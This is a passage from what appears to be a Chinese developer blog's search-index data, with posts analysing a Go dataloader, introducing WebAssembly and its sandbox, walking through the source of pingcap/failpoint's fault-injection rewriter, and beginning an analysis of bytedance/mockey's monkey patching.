Thunk，所以不同请求中同样的 Key 会获取到同一个 Thunk，也即同一个闭包，当然也就根据同一份回源操作拿到了同样的数据。 我们具体来看 Loader.Load 方法，它首先定义了一个 channel 和一个临时结构体 result，前者用于通知 Thunk 函数“计算已经完成”，后者则被 Thunk 用作记录最终的计算结果。我们前面提到，Thunk 函数是 dataloader 在缓存中保存的东西，这个版本的 dataloader 对缓存接口的定义中包括 Get/Set/Delete/Clear 四个方法，不包括 GetOrSet 这种原子操作，所以为了保证读写的原子性，Loader 结构中有 cacheLock 字段专门用于对缓存操作加锁。回到代码中，如果 Loader 的缓存中已经存在某个 key 对应的 Thunk 函数，那么直接将该函数返回，否则创建一个新的 Thunk，并以请求的 key 作为索引保存在缓存中，这样一来，同一个 key 的所有请求都会从缓存中获取到同一个 Thunk，从而达成了去重的目的避免冗余的回源。 接下来回到 Thunk 本身，可以看到它是一个捕获了前面定义的 result 结构的闭包，如果 result.value 的值为 nil，那么它就会尝试从前文定义的 channel 中读取结果，并将读到的结果赋值到 result 中。需要注意的是，尽管读取和写入 result 时都加了锁，但当多个 goroutine 请求同一个 key 时，它们中仍可能有多个会走到从 channel 中读取数据部分的逻辑。但这个 channel 被定义为只能容纳一个元素，且它也不可能一直被写入数据，所以如果 channel 的写入方仅仅只是把回源的结果写入后就不管这个 channel，那么这些尝试从 channel 中读取数据的 goroutine 就会永远阻塞在这里。解决这个问题的方法就是向这个 channel 中写入数据后理解对其调用 close，因为读取已关闭的 channel 是不会阻塞的，只是如果使用类似 v, ok := &lt;-channel 的语法，那么 ok 会返回 false。回到 Loader 中的逻辑，如果 ok 不为 true，那么 result 并不会被更新。 我个人认为这里的 Thunk 实现的不够高效，因为它的完整流程需要加锁三次。这里之所以有这么多的锁操作，是因为 result 的赋值和读取都被放在 Thunk 中，如果将 result 换成指针并将其传递给负责回源的 goroutine，由它来完成 result 的赋值，并在赋值结束后通过关闭 channel 来通知 Thunk（或者参考 singleflight 使用 WaitGroup 来通知），这样 Thunk 就只需要直接通过闭包从 result 里读取数据，完全不需要依靠加锁来避免竞争了。 到这里为止，Thunk 的部分就结束了，接下来我们来看回源逻辑。 Loader.curBatcher 是一个 batcher 类型，该类型定义了一系列方法用于异步回源。对于 curBatcher，它是延迟初始化的，即当且仅当它被使用时才会进行初始化，所以为了避免并发环境导致 curBatcher 被重复初始化，Loader 定义了 batchLock 字段专门对 batcher 的操作进行加锁。之所以如此大费周章也要做成延迟初始化的形式，是因为每个 batcher 结构只能被使用一次，它会负责聚合一段时间内的请求并调用使用方传给 Loader 的回源函数做具体的回源，这波回源完，下一波请求就需要新的 batcher 来负责了。 在实现上，batcher 的 input 被定义为一个 batchRequest 的 channel，这个 channel 的容量由 Loader.inputCap 决定，该字段的值可以通过调用 NewBatchedLoader 函数时传递 WithInputCapacity 来修改，默认为 1000，这个字段可以理解为并发度，即同一时间最多有 1000 个 key 可以被写入。当 Loader.Load 方法被调用时，key 和 result 的 channel 会组合成 batchRequest 结构通过 batcher.input 传递给 Loader.curBatcher，input 这个 channel 在 batcher.batch 方法中被读取，这个方法在调用时通过另一个 goroutine 来承载，所以它不会阻塞调用 Loader.Load 的 goroutine。batcher.batch 通过 for-range 不停地读取 batcher.input，这个操作在 input 被 close 之前会一直阻塞在这里，而它后面的逻辑就是正常的回源操作。所以不难想象，当满足某个条件时，这个 channel 一定会被 close，从而触发回源并将结果写回 batchRequest 的 channel 来通知 Thunk。 继续阅读源码，我们会发现 batcher.end 方法对 batcher.input 调用了 close，它本身没有加锁，所以它的调用方一定加过锁，否则会因为重复关闭 channel 而导致 panic。这样一来，batcher.end 就可以被认为是回源操作的触发器，它被两个地方调用，分别是 Loader.sleeper 和 Loader.Load。我们首先来看前者，它的作用是“等一段时间”后调用 batcher.end，这其实就是常规的 dataloader 加载数据的方式，它等待的时间由 Loader.wait 字段决定，这个字段可以在调用 NewBatchedLoader 函数时通过 WithWait 来修改，默认是 16 毫秒。然而，单纯的通过时间来触发回源是有风险的，因为短短的 16 毫秒就可能让 batcher.input 中积累大量的 key，这些 key 会一起传递给回源函数，从而给下游造成压力，因此我们需要有一种机制来控制每次回源的 key 的数量，并在 batcher 积累了足够的数量后提前回源，从而不影响后续的 key 进入新的 batcher，而这就是 batcher.end 的另一种使用方式，它被定义在 Loader.Load 中。 具体而言，在调用 NewBatchedLoader 函数时可以通过传递 WithBatchCapacity 来修改 Loader.batchCap，即单次回源可以接受的最大 key 数量，和 Loader.inputCap 不同，这个值默认值为 0，表示不作限制。当它大于 0 时，Loader 会在 Loader.count 中记录当前已经传递给 batcher 的 key 数量，当 Loader.count 达到 Loader.batchCap 时立即调用 batcher.end 方法来触发回源，并通过 Loader.reset 来将 batcher 赋值为 nil，这样当新的 key 到来时，新的 batcher 就会被创建。由于 batcher.end 是幂等的，所以即便放任 Loader.sleeper 正常执行也没有关系，但如果 Loader.wait 的值很大，那么可能会导致 goroutine 数量持续增高，因此当 Loader 因为达到 batchCap 而提前回源时，终止 Loader.sleeper 的执行是必要的，这通过一个监听了两个 channel 的 select 来实现。 完整看下来，可以发现 Loader.Load 对 key 的去重完全依赖缓存，而 dataloader 使用的缓存是可以修改的（通过 WithCache 实现），所以根据缓存的容量、逐出策略的不同，很可能重复的 key 在缓存中却读不到对应的 Thunk（更极端的，dataloader 还提供了 NoCache 来适应一些特殊场景），此时 batcher 中就会有重复的 key，因此传递给回源函数的 key 列表中也会有重复的元素。在 dataloader 中，回源函数被定义为 BatchFunc 类型，它的注释中提到 dataloader 会保证传给它的 key 列表中没有重复元素，这个说法是不严谨的，因此如果你使用了这个库，那么在编写 BatchFunc 时可能需要注意这一点，必要时需要手动进行去重。 到此为止，我们就分析完了 Loader.Load 这个核心方法，dataloader.Interface 的其他方法相对比较简单，这里就不进行分析了，有兴趣的朋友可以继续阅读相关的部分，也欢迎一起交流。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅谈 WebAssembly","slug":"WebAssembly","date":"2023-02-25T18:00:57.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/02/26/WebAssembly/","link":"","permalink":"/2023/02/26/WebAssembly/","excerpt":"","text":"最近阅读了 MDN 上 WebAssembly（以下简称 wasm）相关的内容，也用 node 做了一些相关的测试，算是基本了解了 wasm 这门技术的背景与使用方法，于是写下这篇文章做一下总结。 首先要明确的是，wasm 是什么呢？看到这个名字，很多人会把它和 Web 联系在一起，但事实上 Assembly 更适合用来描述它的定位。我认为比较合适的说法是，它是一套虚拟指令集，通过配合相应的虚拟机就可以完成程序员编码出的任务。具体而言，wasm 是一种基于栈机的指令集。 这里简单解释下栈机，根据我的了解，虚拟机可以被分为栈机、累加器机和寄存器机，区分它们的一个重要方式在于读写操作数的方式。栈机在逻辑上存在一个操作栈，取数时会把操作数入栈，计算时会从栈顶取数并把结果入栈；累加器机在计算时则需要将操作数加载到累加器上，基于这个累加器做运算，然后再把结果保存到存储单元上；寄存器机则提供了很多高速的寄存器，如果操作数不多完全可以基于寄存器来做运算，我们现在使用的个人电脑就是寄存器机。 回到正题，正因为 wasm 是一套指令集，所以它可以作为各种语言的目标语言，比如 LLVM 就提供了从 LLVM-IR 到 wasm 的编译支持，这意味着只要某种语言可以被编译成 LLVM-IR，那么它就可以继续被编译成 wasm。除此之外，wasm 还定义了一种 wat 作为后缀名的文件，里面可以通过一种 S 表达式方式的语法来编写既定的指令，这些指令可以被诸如 wabt 这样的工具编译成 wasm 的二进制文件，下面是一个简单的 wat 程序，它提供一个 add 函数用于计算两个数字的值： 1234567(module (func (export &quot;add&quot;) (param $x i32) (param $y i32) (result i32) local.get $x local.get $y i32.add )) 但如果 wasm 仅仅是作为一种虚拟指令集被提出，那它的价值也许没有那么大，一个帮助 wasm 从虚拟指令集中脱颖而出的重要原因，是浏览器的 JavaScript 原生支持 wasm 的加载与执行。比如我们将上面的 wat 文件编译为 wasm 二进制，假设命名为 main.wasm，那么我们就可以使用如下的代码在 JavaScript 中使用这个函数： 12345678WebAssembly.instantiateStreaming(fetch(\"main.wasm\"), &#123; // 这里用来向 wasm 提供一些 JavaScript 内容&#125;).then(obj =&gt; &#123; const ret = obj.instance.exports.add(1, 2) // 调用导出的 add 函数拿到计算结果 console.log(\"get result:\", ret) // 输出这个结果&#125;).catch(err =&gt; &#123; console.error(\"failed to run wasm, err:\", err)&#125;) 现代的 Web 应用太复杂了，JavaScript 作为实现网页动态交互的核心语言，在保证了灵活性的同时却很难兼顾性能。举例来说，对于一个返回常量 1 的函数 getOne，静态语言可以直接将其内联优化，但 JavaScript 不能简单地这样做，因为它无法保证 getOne 在运行期间会被赋值成什么东西，也许是一个返回其他值的函数，或者也许都不是一个函数了。尽管这种特性在一些场景下为代码的编写带来了方便，但在另一些特定场景下，我们并不需要这种动态特性，一个重要的领域就是计算场景，在这里我们能够确定参数的类型，只是需要做大量的复杂计算，而这就是 wasm 大放异彩的地方，在这个场景下它可以提供超过 Js 的性能。 此外，由于浏览器加载的是 wasm，但它并不关注这个 wasm 是怎么得到的，这意味着我们可以用任意一种语言来编写代码，然后将它们编译成 wasm 让浏览器来执行。更有趣的是，JavaScript 可以执行 wasm 提供的函数，wasm 也可以执行 JavaScript 提供的函数。基于这两点，我们就可以做到更多有趣的事情。比如我们可以在 Js 中封装一些 DOM 操作并提供给 wasm，然后通过其他语言来使用这些函数，这样我们就有了通过各种语言操作 DOM 的能力，也就是说，网页的编写就不会只限制在传统的三剑客（HTML、CSS、JavaScript），其他语言也可以参与进来。在这个思路上已经有一些实践，比如 golang 提供了 wasm 作为编译目标，且提供了对 DOM 的封装，又比如 vugu 这个项目，让 HTML 可以与 golang 中的结构相互配合。 除此之外，wasm 一个更广为流传的特点就是它的安全性，也就是所谓的“沙箱”。具体而言，wasm 能够访问的资源是外部可控的，在这其中首先应该被讨论的就是内存。每一个 wasm 可以拥有属于自己的一段内存，这段内存可以从外部导入，比如 JavaScript 提供了 WebAssembly.Memory 对象供 wasm 使用，也可以由 wasm 自己主动申请，不过二者只能选一个，但不论是哪一种，当前 wasm 能够使用的最大内存大小是 4GB，你可以通过 new WebAssembly.Memory({ initial: 1, maximum: 65537 }) 这样一条 Js 语句来验证这个问题，wasm 的内存是分页的，一页 64 KB，所以最多能够申请 65536 页，这里尝试申请 65537 页，所以它会抛出 RangeError 的异常。 此外你有可能想到，wasm 是基于栈机的，所以我们可以在里面写一个无限循环，循环体中不停地向栈中压入内容来试图触发栈溢出，但我自测时是没有问题的，比如对于下面的代码就可以一直执行下去： 12345678(module (func (export &quot;main&quot;) (loop $my_loop i32.const 10086 br $my_loop ) )) 我个人猜测是因为 br 每次跳回 loop 时都会清理掉这次循环对应的逻辑栈的内容，所以 i32.const 10086 这个声明事实上只在逻辑栈中占用 4 个字节的位置，但我没有找到相关的官方描述。 除了内存以外，wasm 也没有能力直接访问其他系统资源，比如网络、磁盘等，除非宿主环境主动向其提供这些能力。我们知道，现代操作系统中的进程如果想要访问系统资源，是需要通过系统调用借助内核来完成的，wasm 也有类似的东西，这个东西被称为 WASI，也就是 WebAssembly System Interface。事实上，由于宿主机环境可以自由向 wasm 导入函数，所以为了访问网络、磁盘，我们完全可以封装一个函数然后提供给 wasm，WASI 的原理也是这个，但它更大的意义在于提供了一种标准，而标准和实现是分离的，标准的存在可以让各种实现能够更好地相互配合。 进程通过系统调用来通过内核访问系统资源，wasm 通过 WASI 来通过宿主环境访问系统资源，那么它们的区别在于什么呢？最核心的区别在于，宿主环境可以灵活而轻量地控制 wasm 可以使用哪些能力，以 JavaScript 为例，wasm 被加载后对应一个 WebAssembly.Module 对象，也即一个模块，而它被运行时需要生成一个对应的 WebAssembly.Instance 对象，一份 wasm 二进制在 Js 中可以对应多个 Instance，每个 Instance 在运行时可以导入不同的 Js 函数，所以即便是同一份 wasm 二进制文件，它在运行时的表现也可能是不一样的，而它的表现完全由宿主环境来决定。 把这个特性放到应用层的代码上，当我们用高级语言导入一个外部模块时，如果不去阅读它的代码，我们不能保证这个模块会带来怎样的影响，比如它可能在启动时随机删除我们计算机上的文件，甚至通过网络下载病毒到本地并运行；但如果我们使用一个外部的 wasm，在运行时不给它提供网络访问、磁盘访问的能力，那么就可以保证它无法通过这些来危害我们的设备。 wasm 本身并不复杂，但它提供了很多有意思的特性，这些特性间的组合就能带来很多可能性。我们再举个例子，上面提到 Js 中有 WebAssembly.Memory 对象，如果将它导入给 wasm，wasm 就可以使用它对应的一段内存，这包括读和写，而 Js 也可以通过这个对象来获取里面的内容，从而达到 Js 与 wasm 交换大片数据的效果。那么如果同一个 Memory 对象被多个 wasm 使用会发生什么呢，不难想到，wasm 之间就有了交换数据的方式，因为它们共享同一块内存，基于这一点，就可以实现类似动态链接的效果。所以我们在进程中运行多个 wasm 实例，就类似于在一个操作系统中运行多个进程，正是因为这种相似性，所以有了 nano process 等概念被提出。而由于进程间的交互可以以服务的维度分隔，所以有了微服务的后端部署方式，对应到 wasm，就有了纳服务（nano service）等概念被提出。 总结而言，由于 wasm 的沙箱特性，以及它可以与各种语言交互，并可以由各种语言编译而成，所以未来一定会在很多领域发挥重要作用。","categories":[{"name":"前端","slug":"前端","permalink":"/categories/前端/"}],"tags":[]},{"title":"浅析 pingcap/failpoint 源码","slug":"failpoint","date":"2023-02-10T14:32:34.000Z","updated":"2023-12-30T18:04:50.525Z","comments":true,"path":"2023/02/10/failpoint/","link":"","permalink":"/2023/02/10/failpoint/","excerpt":"","text":"前言golang 是一门设计非常优良的语言，它提供了 go/ast、go/parser 等一系列标准库来解析自身，通过这些工具的相互配合，使用者可以从一份标准的 golang 源码获取其对应的 AST 表示，并基于 AST 来做具体的业务逻辑。尽管 golang 的语法很简单，但其 AST 的构成依然比较复杂，所以我一直想找到一个应用了 AST 的项目来学习，而 pingcap 的 failpoint 就是这样一个项目。 在正式开始之前，先安利下 https://astexplorer.net/ 这个网站，它提供各种语言的 “源码 -&gt; AST” 的实时转换，并可以同步高亮两边的内容，用来了解各种代码的语法树结构非常方便。 failpoint 的使用方式在 failpoint 的代码库中，failpoint-ctl 这个目录下有一个 main.go 文件，如果你在代码库目录中执行 make 命令，就会以这个 main.go 为入口文件构建一个 cli 工具。这个工具提供 enable 和 disable 两个命令，前者驱动 failpoint 的代码重写器，后者驱动 failpoint 将重写后的代码恢复到原来的样子。 当你在自己的代码中引入 failpoint，并使用了它的 Marker 函数编写自己的故障注入逻辑后，对代码目录执行 failpoint-ctl enable ，failpoint 就会把文件中的 Maker 函数替换成一些有意义的节点，这个重写后的文件会替代原来的文件，而原文件的名字后面会加上 __failpoint_stash__ 的后缀，因为这样在编译时新老文件就不会相互影响。 failpoint 作为一个外部库，提供了一些 Marker 函数供用户使用，其中最重要的是failpoint.Inject 和 failpoint.InjectContext。以 Inject 函数举例，假设有如下代码： 123failpoint.Inject(\"test\", func(_ failpoint.Value) &#123; fmt.Println(\"hello world\")&#125;) 在经过 failpoint-ctl 的代码重写后，这个代码就会变成下面的样子： 123if _, _err_ := failpoint.Eval(_curpkg_(\"test\")); _err_ == nil &#123; fmt.Println(\"hello world\")&#125; 其中 _cur_pkg_ 起到类似宏一样的效果，作用是在用户提供的字符串中添加文件所在的包前缀，这样即便不同的包使用了相同的自定义字符串，也不会相互影响。另外，Inject 函数的第二个参数是一个 interface{}，所以虽然这里需要提供一个函数，但这个函数的签名有多种选择，比如可以直接不提供 failpoint.Value。 除此之外，还有一些用于辅助 Inject 的 Marker 函数，比如 failpoint.Break，failpoint.Label，failpoint.Continue 等等，你会发现这些函数的名字和 golang 中的关键字是一样的，这不是巧合，因为它们确实是以对应的 golang 关键字的形式来生效的。事实上，这些 Marker 都是空函数，所以在正常情况下它们会被编译器优化掉，但对于 golang 的 AST 而言，它们都是能被解析到的树上的节点，所以 failpoint 在遍历 AST 时可以对它们做进一步的处理。 总而言之，通过组合 failpoint 提供的各种 Marker 函数，就可以构建一条完整的程序执行链路，这条链路在代码重写前会被编译器优化掉（也就等于没有这条链路），而代码重写后则会实实在在的影响程序的流程。通常而言，这条重写后的链路以 Inject 中第二个参数对应的函数为起点（在重写后它变成了 Eval 的 if 语句块），而这个函数能否被执行则取决于 Inject 的第一个参数。 Inject 的第一个参数是一个被称为 failpath 的自定义字符串，前面提到这个字符串在代码重写后会自动加上包名作为前缀，所以你不用担心自己定义的字符串会与其他包中已有的 failpath 相互冲突。在 Inject 被重写成 Eval 后，当且仅当对应的 if 为 true 时才会执行用户自定义的逻辑，那么如何将这个 if 变成 true 呢，failpoint 提供了环境变量与 HTTP 两种方式，这部分放到后面的小节来展开讲。 代码重写实现重写如前所述，代码重写的目的在于将 Marker 函数转变为有意义的 golang 关键字或 Eval 函数调用，这部分逻辑被定义在 code/rewriter.go 和 code/expr_rewriter.go 中，与之相对的，code/restorer.go 用于实现代码的恢复。 先来看 rewriter 的逻辑，它的 Rewrite 方法被 main.go 所驱动，所以这是代码重写器的逻辑入口，这个函数的最终目的是获取某个 path 下的一批文件，针对这些文件调用 RewriteFile 方法。具体来说，Rewrite 方法寻找那些引入了 failpoint 的 go 源码文件，因为只有这些文件才有可能使用各种 Marker 函数，由于这里仅需要判断“是否引入了 failpoint” 这个问题，所以调用 parser.ParseFile 时传递了 parser.ImportsOnly 选项，代表仅仅解析文件的 ImportSpec 节点。 RewriteFile 方法首先用当前解析的文件初始化 Rewriter 结构中的一些字段，然后找出 file.Decls 中的 FuncDecl，即函数定义，并对它们调用 rewriteFuncDecl 进行语法树的重写，除此之外，RewriteFile 还完成 Binding 文件的写入（即 _cur_pkg_ 这个“宏”的定义）、重命名原文件（在文件名后面添加后缀）以及将改写后的 AST 写入与原文件同名的文件（通过 format.Node 函数实现）等一系列工作，当 Rewrite 对找出的所有目标文件都调用了 RewriteFile 后，整体的代码重写就完成了。 从 rewriteFuncDecl 方法开始，failpoint 就开始处理语法树上的节点了，这里没有直接使用 golang 标准库提供的 Walk 语法，而是针对一系列节点实现了 rewriteXXX 函数，比如 rewriteIfStmt、rewriteAssign 等等，从 Stmt 开始一层一层地处理 AST。为什么没有直接使用 Walk 呢，因为在遍历的过程中需要对节点做修改，而且还要能够感知父节点，而这些用 Walk 来做会非常麻烦。 这一系列的 rewrite 非常好地覆盖了所有能够出现 Marker 函数的地方，是学习 golang AST 的绝佳样例。而这些 rewrite 的尽头是被定义在 code/expr_rewriter.go 中的 exprRewriters，这是一个 map，key 是 Marker 函数的名字，value 是对应的重写方法。当 failpoint 遍历到 SelectorExpr 节点时，会判断是否为 failpoint.XXX ，并使用 XXX 到 exprRewriters 这个 map 中去寻找对应的重写函数，然后调用它来完成代码的重写。 在调用这些重写函数时，failpoint 将 CallExpr 传了下来，这是重写函数对应 AST 节点的父节点，所以能够直接通过修改这个父节点来将 Marker 函数从 AST 中剔除掉。重写函数的逻辑基本相同，都是对 AST 做一些校验，然后构建新的节点来完成替换，这里以 rewriteInject 方法为例来过一下代码重写的过程，其他函数基本同理。 我们前面给出了 Inject 函数的使用方式，它需要接受两个参数，分别是 failpath 与一个自定义的函数，通常来讲，编译器或 IDE 能够保证这个函数调用的合法性，不过 rewriteInject 中还是通过判断 CallExpr.Args 的长度来再次保证了下。验证完长度后，rewriteInject 从 CallExpr.Args 中取出了这两个参数，第一个参数只要保证是一个 Expr 即可，因为生成的 Eval 函数调用的第一个参数接受的也是一个 Expr，所以这里不需要去确认具体的 Expr 类型。而第二个参数的要求则相对严格，它只能是 nil、没有参数的函数和接受一个 failpoint.Value 参数的函数这三种类型中的某一个。在验证完了参数的合法性后，rewriteInject 就会生成一系列的 AST 节点，这些节点就代表上文所述的 if 中调用 Eval 的代码，以及从 Inject 的自定义函数中提取出来的函数体内容。 恢复与代码重写不同，代码的恢复就比较简单了，如果你只想要将代码恢复到重写前的样子，只需要用 xxx.go__failpoint_stash__ 覆盖 xxx.go，然后删除 _cur_pkg_ 所在的文件即可。不过 failpoint 没有做得这么粗暴，它在实现上读取了覆盖前的文件内容，记为 a，然后用 Rewriter 的 Rewrite 方法获取a 对应的重写后的内容 b，而此前 a 已经有一份被保存到文件中的重写后的内容 c，所以 failpoint 会对 b 和 c 做一个 diff，找出 c 在 b 的基础上做的修改，然后将它应用到 a 中。这样做的好处在于，如果你在代码重写后修改了 c，只要代码所在的行数没有发生变化，那么在恢复时这个修改就可以继续保留下来。 故障注入实现通常而言，failpoint 的使用者使用 Inject 函数的第一个参数，也就是 failpath 来标识一种故障，当然多个 Inject 的调用可以传递相同的 failpath，这时如果启用了这个 failpath，那么这些 Inject 都会被执行到。如前所述，Inject 函数在经历 AST 重写后会变成 Eval 函数，所以我们可以通过查看这个函数的代码来了解故障注入是如何发生的。 可以看到，Eval 的逻辑其实很简单，它直接调用了 failpoints.Eval 方法，failpoint 是一个全局的 Failpoints 结构，所以对它内部字段的操作很可能会导致并发问题，因此 failpoints.Eval 首先做的事情就是加锁，然后到 failpoints.reg 中根据用户传入的 failpath（也就是传给 Inject 的第一个参数）来寻找一个 fp，然后调用这个 fp 的 Eval 方法。fp 是什么呢，根据Failpoints 结构的定义，我们可以发现这是一个名为 Failpoint 结构（少了一个 s），它被定义在源码中的 failpoint.go 文件中。继续深入到 Failpoint.Eval 这个方法中，会发现这里也是先加了个锁，然后去调用了 fp.t.eval，具体来说，是一个名为 terms 的结构的 eval 方法，而这个 terms 则大有来头。 通过梳理上面的这条链路我们就可以知道，当 Inject 被重写为 Eval 时，它最终会通过用户传递的 failpath 找到一个 terms，然后执行它的 eval 方法，这个方法会拿到一个 failpoint.Value 和一个 error，而这两个正是重写后的 AST 的 if 语句块接受的两个局部变量。不难想到，我们需要一种人为可控的方式，来把 failpath 和 terms 关联起来，从而灵活地返回不同的值来制造出不同的故障。failpoint 提供了两种，分别是环境变量和 http server。 环境变量failpoint 的 README.md 中有提到，可以通过给 GO_FAILPOINTS 这个环境变量传递特定格式的值，来用不同的方式启动 failpath，格式的定义是这样的： 1[&lt;percent&gt;%][&lt;count&gt;*]&lt;type&gt;[(args...)][-&gt;&lt;more terms&gt;] 这一坨正则表达式一样的东西看起来不怎么直观，下面来看一个具体的例子： 1GO_FAILPOINTS='main/test=5*return(\"hahaha\")-&gt;50%return(\"walalala\")' 这个环境变量带来的效果是，main/test 这个 failpath 的前五次执行会通过 failpoint.Value 返回字符串形式的 “hahaha”，此后的执行则有 50% 的概率会返回字符串形式的 “walalala”，另 50% 则什么都不做。 此外，如果想设置多个 failpath，则可以通过半角的分号来分割，比如： 1GO_FAILPOINTS='main/test=5*return(\"hahaha\")-&gt;50%return(\"walalala\");main/test2=return(10086)' 这个例子设置了两个 failpath，main/test 和上面的逻辑是一样的，但与此同时也启用了 main/test2 这个 failpath，它固定通过 failpoint.Value 返回数值类型的 10086。 所以，通过在运行程序前设置 GO_FAILPOINTS 这个环境变量，就可以把某个 failpath 和一种链式的逻辑绑定起来，这个链上通过 -&gt; 连接了一系列的具体逻辑，从前向后只要有一个能执行就会停止后面的逻辑。事实上，在代码层面这些一个个逻辑就对应一个 term，而一批 term 就组成了 terms，正如我们上面提到的，failpath 就是和一个 terms 结构对应起来的。 在 failpoints.go 文件中，有一个 init 函数，这个函数在程序启动时会领先于 main 函数执行，它读取了 GO_FAILPOINTS 这个环境变量，通过半角分号分割出不同的 failpath，然后执行 Enable 函数来完成 failpath 与 terms 的绑定。这个函数和上面提到的 Eval 相同，都是层层包装，最终调用的是 Failpoint.Enable 这个函数，而这个 Failpoint 会被注册到全局 failpoints 的 reg 中，方便 Eval 在执行时通过 failpath 查找到。 Failpoint.Enable 接受一个名为 inTerms 的参数，这个参数的值其实就是上面环境变量中等号后面那一坨，具体是指 5*return(&quot;hahaha&quot;)-&gt;50%return(&quot;walalala&quot;) 和 return(10086)，这个 inTerms 会被传递给 newTerms 函数，这个函数非常关键，它最终的效果是把这坨表达式转换成对应语义的代码，这是通过遍历 inTerms 并根据语法调用一系列的 parseXXX 来实现的。 terms 结构中有一个 term 数组，terms.eval 方法在执行时会遍历这个数组，找到第一个 allow 方法返回 true 的 term，然后调用它的 do 方法并返回执行的结果。这里 allow 的判断就对应上面的 5* 和 50%，分别通过 modCount 和 modProb 来实现。而 do 方法则对应上面的 return(&quot;hahaha&quot;)，事实上，这个在语法中被称为 type 的部分取值有很多，被定义在 actMap 中，每种取值对应一个函数。以 return 举例，它对应的函数 actReturn 的逻辑非常简单，就是直接将括号中的值解析并返回，解析是通过 parseVal 函数来实现的，它能够解析字符串、数字以及布尔值。 所以总结下来，用户可以通过 GO_FAILPOINTS 这个环境变量控制一个或多个 failpath 在什么情况下被触发，failpoint 在程序启动时会将这个环境变量的值解析成对应逻辑的代码，当用户程序执行到 Eval 时就会触发这部分逻辑，从而按用户的意愿来决定返回怎样的值。 HTTP Server环境变量的方式虽然很灵活，但它的缺点在于一旦程序启动后就不可变了，一些大型系统的启动时间可能会很长，同样一些程序的状态也可能很难构造，所以我们需要一种能够在程序执行期间动态修改 failpath 对应 terms 的能力。 failpoint 通过在程序中嵌入一个 HttpServer 来实现这个功能，具体而言，用户在启动时可以通过 GO_FAILPOINTS_HTTP 传递一个 host，这个 host 在程序启动时会被传递给 net.Listen 函数来获取一个 tcp 的 listener，并在这个 listener 上放置一个 HTTP 的应用。 通过查看对应的代码，可以发现这个 HTTPServer 把请求中的 URL.Path 视为 failpath，并接受 PUT、GET 和 DELETE 三种 HTTP 方法，分别用于启用某个 failpath、查询某个或全部的 failpath 状态以及禁用某个 failpath。 通过这种方式，就实现了程序运行期间动态注入故障的功能。","categories":[{"name":"Golang","slug":"Golang","permalink":"/categories/Golang/"}],"tags":[]},{"title":"浅析 bytedance/mockey 源码","slug":"mockey","date":"2023-01-26T14:32:34.000Z","updated":"2023-12-30T18:04:50.529Z","comments":true,"path":"2023/01/26/mockey/","link":"","permalink":"/2023/01/26/mockey/","excerpt":"","text":"前言monkey patch 是一种在运行时动态修改函数或变量内容的功能，被广泛用在单元测试中。比如一个功能函数需要调用一次 rpc 拿到数据，然后对响应体做一些计算处理后再返回最终结果，那么为了测试这个功能函数的计算逻辑，就可以通过 monkey patch 来修改掉 rpc 的部分，按需返回不同的响应，从而灵活地进行各种 case 的测试。通常而言，动态修改函数内容是动态语言提供的福利，但借助一些特殊手段，静态语言也可以实现同样的效果。本文以字节跳动开源的 v1.1.1 版本 mockey 库为例，通过分析源码的方式来学习 golang 中实现 monkey patch 的方法。 mockey 对外提供的核心功能有两点，一个是运行时修改变量，一个是运行时修改函数，下面会分别对这两种能力进行分析。 修改变量这个功能感觉上有点云里雾里，因为变量其实就是可以手动修改的。mockey 在常规修改上包装了一层，通过反射来实现各种变量的 patch 和 unpatch，并在这个过程中通过加锁保证同一个 mock 结构的并发安全。 修改变量的功能主要通过 MockerVar 结构 来实现，这个结构与一个要被修改的变量一一对应，为了保证修改的并发安全，最好能做到唯一对应。使用者可以通过 MockValue 函数 来得到这个变量，后续的操作都通过这个变量来完成。MockValue 的实现非常简单，首先断言入参是否为指针，如果不是指针就进行 panic，这个断言直接通过判断 reflect.TypeOf(ptr).Kind() == reflect.Ptr 的结果来实现。不过 v1.1.1 版本的 AssertPtr 和后面会用到的 AssertFunc 都有点小问题——格式化字符串后面没有带具体的变量，不过这无伤大雅。MockValue 的断言通过后，就会返回一个 MockerVar 结构，其内部已经保存了变量的原始值与类型等信息。 用户想要 patch 的变量值通过 MockerVar.To 方法来提供，这个方法首先判断入参是否为 nil（这里的判断直接通过双等来做，其实由于那个著名的 interface{} 与 nil 的问题，这里的 nil 判断并不准确），如果为 nil，那么就用 reflect.Zero(mocker.targetType) 来构建一个零值，并用这个值来 patch 对应的变量，否则通过 reflect.ValueOf(value) 使用用户提供的值，这个值会被放入 MockerVar.hook 字段中。为了确保 hook 中的值是能够赋值给 MockerVar.target，也就是目标变量的，To 方法断言了 v.AssignableTo(mocker.targetType)，这个 v 取的是 hook 的类型，如果这个断言能通过，那么后面给 target 赋值时就不会发生 panic。 做完了前置的判断，MockerVar.To 就会直接调用 MockerVar.Patch 方法，这个方法通过加锁的方式来判断 MockerVar.isPatched 变量，如果其为 false，那么说明当前的目标变量没有被 patch 过，此时会用 mocker.target.Set(mocker.hook) 来实现变量的赋值，然后调用 addToGlobal 函数 ，这个函数会先判断当前 MockerVar 的 key 是否在一个全局的 map 中，如果已经存在了，那么说明某个变量对应了两个 MockerVar 结构，此时会因为断言而结束程序的执行。因为这个 key 实际上 是被 patch 的变量的地址 ，所以能够保证与对应变量的一一对应关系，从而也就基本保证了 patch 操作的全局可控。这里说“基本保证”，是因为这个全局 map 的读写没有加锁，所以这个保证也不够彻底。 所以，MockerVar.To 被调用后，整个变量的 patch 操作就结束了，此时变量的值已经被修改为 To 函数的入参，To 函数将 MockerVar 返回，用户可以通过这个结构调用 MockerVar.Unpatch 方法做变量的 unpatch，在这个操作被触发之前，该变量 没有办法再次进行 patch。Unpatch 方法其实就是 Patch 方法的逆操作，也就是通过 mocker.target.Set 来完成 target 的恢复，通常来讲这个值被保存在 origin 中，然后再调用 removeFromGlobal 将当前 MockerVar 结构从全局 map 中移除，这样就可以再次进行 path，这可以通过当前 MockerVar 来实现，也可以新建一个 MockerVar 来做这件事情。 修改函数相较于修改变量，修改函数就变得比较复杂了，在继续阅读前，我强烈推荐读者阅读一下 这篇文章，这是 monkey 这个库的作者在其博客中描述的运行时修改函数的实现原理，讲得非常通俗易懂。mockey 的思路基本与此类似，不过它在这之上提供了更多额外的功能。 修改函数的功能主要通过 Mocker 结构来实现，可以看到相较于 MockerVar 结构，这里多了很多字段。为了产生这个结构，需要通过 MockBuilder 结构来完成内部字段的初始化，具体而言，Mock 函数会得到最初的 MockBuilder，然后用户可以通过这个结构的各种方法来完成其他字段的赋值，这些方法会继续返回当前的 MockBuilder 